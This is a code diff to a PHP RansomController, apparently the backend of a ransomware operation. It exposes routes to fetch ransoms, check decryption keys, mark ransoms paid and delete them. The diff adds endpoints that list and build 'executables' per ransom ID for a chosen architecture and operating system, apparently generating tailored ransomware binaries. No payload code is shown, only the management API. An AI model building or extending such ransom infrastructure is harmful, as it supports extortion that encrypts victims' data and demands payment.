@@ -10,6 +10,7 @@ require_once __DIR__ . "/../models/cryptocurrency/crypto_type.php";
 use SmallPHP\CurrentJwt\TokenData;
 use SmallPHP\Models\CipherType;
 use SmallPHP\Models\CryptoType;
+use SmallPHP\Models\ResourceNotFoundException;
 use SmallPHP\Services\RansomService;
 
 class RansomController extends Controller
@@ -26,10 +27,37 @@ class RansomController extends Controller
         $this->add_endpoint("GET", "id/{string:id}", [$this, "fetch_ransom"]);
         $this->add_endpoint("GET", "{string:id}/{string:key}", [$this, "check_decryption_key"]);
         $this->add_endpoint("GET", "list", [$this, "get_all_ransoms"]);
+        $this->add_endpoint("GET", "{string:id}/executables", [$this, "get_all_executables"]);
         $this->add_endpoint("PUT", "{string:id}", [$this, "update_ransom"]);
         $this->add_endpoint("POST", "", [$this, "create_premake_ransom"]);
+        $this->add_endpoint("POST", "{string:id}/executables/{string:architecture}/{string:system}", [$this, "create_executable"]);
         $this->add_endpoint("PATCH", "{string:id}", [$this, "set_paid_ransom"]);
         $this->add_endpoint("DELETE", "{string:id}", [$this, "delete_ransom"]);
+    }
+
+    public function get_all_executables(array $query_params, HttpResponse $response): void
+    {
+        $response->headers["Content-Type"] = "application/json";
+        $response->status_code = 200;
+        $response->body = json_encode($this->service->get_executables($query_params["id"]));
+    }
+
+    public function create_executable(array $query_params, HttpResponse $response): void
+    {
+        $response->headers["Content-Type"] = "application/json";
+
+        try
+        {
+            $response->status_code = 200;
+            $this->service->create_executable($query_params["id"], $query_params["architecture"], $query_params["system"]);
+        }
+        catch(ResourceNotFoundException $e)
+        {
+            $response->status_code = 404;
+            $response->body = json_encode(["error" => $e->getMessage()]);
+        }
+
+        // $response->body = json_encode();
     }
 
     public function update_ransom(array $query_params, HttpResponse $response): void
